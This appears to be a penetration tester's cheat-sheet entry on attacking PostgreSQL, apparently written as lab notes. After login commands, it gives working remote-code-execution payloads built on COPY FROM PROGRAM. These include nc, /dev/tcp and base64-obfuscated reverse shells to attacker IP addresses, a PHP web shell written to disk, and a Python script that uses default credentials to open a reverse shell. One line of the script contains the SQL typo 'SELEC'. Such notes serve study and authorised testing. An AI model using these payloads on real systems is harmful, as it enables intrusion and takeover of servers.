### Postgres

Check out hacktricks.

#### Login

```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U $user -d <database> # Remote connection
psql -h <host> -p <port> -U $user -W <password> <database> # Remote connection
```

#### Enumeration

```bash
\s history
```

#### RCE

```bash
#PoC
\c postgres
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;


COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.178 80 >/tmp/f';
COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/192.168.45.178/10000 0>&1';
COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzgvODAgMD4mMSAgICAg|base64 -d|bash'; # 80
```

```bash
postgres=# DROP TABLE pwn;
DROP TABLE
postgres=# CREATE TABLE pwn (t TEXT);
CREATE TABLE
postgres=# INSERT INTO pwn(t) VALUES ('<?php @system("$_GET[cmd]");?>');
INSERT 0 1
postgres=# SELECT * FROM pwn;
               t                
--------------------------------
 <?php @system("$_GET[cmd]");?>
(1 row)

postgres=# COPY pwn(t) TO '/tmp/cmd.php';
COPY 1
postgres=# DROP TABLE pwn;
DROP TABLE
```

```python
#!/usr/bin/env python3
import psycopg2


RHOST = '192.168.56.47'
RPORT = 5437
LHOST = '192.168.49.56'
LPORT = 80
USER = 'postgres'
PASSWD = 'postgres'

with psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASSWD) as conn:
    try:
        cur = conn.cursor()
        print("[!] Connected to the PostgreSQL database")
        rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
        print(f"[*] Executing the payload. Please check if you got a reverse shell!\n")
        cur.execute('DROP TABLE IF EXISTS cmd_exec')
        cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
        cur.execute('COPY cmd_exec FROM PROGRAM \'' + rev_shell  + '\'')
        cur.execute('SELEC * from cmd_exec')
        v = cur.fetchone()
        #print(v)
        cur.close()

    except:
        print(f"[!] Something went wrong")
```